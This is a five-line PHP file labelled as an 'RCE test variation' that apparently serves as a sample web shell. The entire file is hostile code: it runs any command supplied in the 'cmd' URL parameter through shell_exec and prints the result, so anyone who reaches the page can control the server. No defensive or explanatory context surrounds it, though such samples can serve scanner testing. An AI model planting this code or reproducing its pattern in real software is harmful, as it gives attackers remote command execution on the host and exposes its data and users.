<?php
// RCE test variation #1029
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>